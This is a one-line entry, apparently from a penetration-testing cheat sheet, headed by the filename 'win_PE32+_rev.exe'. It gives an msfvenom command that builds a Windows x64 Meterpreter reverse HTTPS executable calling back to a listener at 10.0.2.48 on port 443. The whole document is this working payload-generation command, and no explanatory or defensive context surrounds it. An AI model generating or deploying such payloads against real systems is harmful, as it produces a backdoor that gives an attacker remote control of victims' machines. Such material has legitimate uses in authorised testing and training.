1. win_PE32+_rev.exe 
> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.2.48 LPORT=443 -f exe > rev.exe
